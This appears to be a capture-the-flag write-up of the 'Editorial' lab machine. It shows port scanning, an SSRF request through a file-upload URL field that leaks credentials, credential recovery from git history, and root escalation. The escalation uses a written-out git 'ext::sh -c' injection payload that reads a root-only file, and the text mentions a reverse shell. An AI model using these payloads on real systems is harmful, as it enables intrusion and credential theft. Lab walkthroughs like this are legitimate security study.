---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Editorial
Linux machine

## Foothold
```shell
nmap -sV -v 10.10.11.20
```
We find ssh, http.

Edit etc hosts (add editorial.htb).

Setup burp proxy and checkout the webpage.

We can see that there is an option to upload file in the "publish with us" section.

Once we try to do more stuff we will notice, that the preview button lets us upload a file.

Once we do even more stuff we will notice that if we insert http://localhost:80 as the `bookurl`, it takes longer then usual (once we check the code on the machine, we will find out, that the standalone `localhost` and `127.0.0.1` names are forbidden).

We can enumerate ports based of the response content length.

Once we try http://127.0.0.1:5000 we get `Content-Length: 51`. If we go to the page it has returned in the response (for example `http://editorial.htb/static/uploads/5793de3b-bdc5-43f9-bdda-e918aec0613d`), we get an error message and a file is downloaded. We can see an api inside the file, so lets try to change the `bookurl` parameter to some of the endpoints. 

Once we try `http://localhost:5000/api/latest/metadata/messages/authors` as the `bookurl`, send the request, and access the page (file) it has returned, we get a message with a username and a password.

The final request:
```text
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------14554399795426013512065509943
Content-Length: 411
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload

-----------------------------14554399795426013512065509943
Content-Disposition: form-data; name="bookurl"

http://localhost:5000/api/latest/metadata/messages/authors
-----------------------------14554399795426013512065509943
Content-Disposition: form-data; name="bookfile"; filename="asd.php"
Content-Type: application/octet-stream

sssss

-----------------------------14554399795426013512065509943--

```

The downloaded file:
```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

We will use the credentials to login using the SSH. 

## User
Once we have logged in, we see a directory `apps` in the home directory. We can see that it's empty. We can check git logs. Now we can see that there was change from the prod user to the dev user. We can check `/etc/passwd` to check that the user `prod` exists. 

Check the commit diff with `git show <commit-hash>`. We will get an older version of the previous message/file with new credentials:
```
'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
```

Log in.

## Root

Use `sudo -l` to check for privileges.

We can see that we are able to run a python program. If we read the source code, we can see that it's some git stuff. The interesting part is the passed flag `-c protocol.ext.allow=always`. Try to google it and baaam! PoC for a similar thing exists. https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221

We alter it to read the root flag.
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >&2'
```

We can also pass a payload to create a reverse shell to our attacker machine (python-pty-shells) to get a root shell.

Other possibility would be to create a file with the SUID and exploit that. https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620
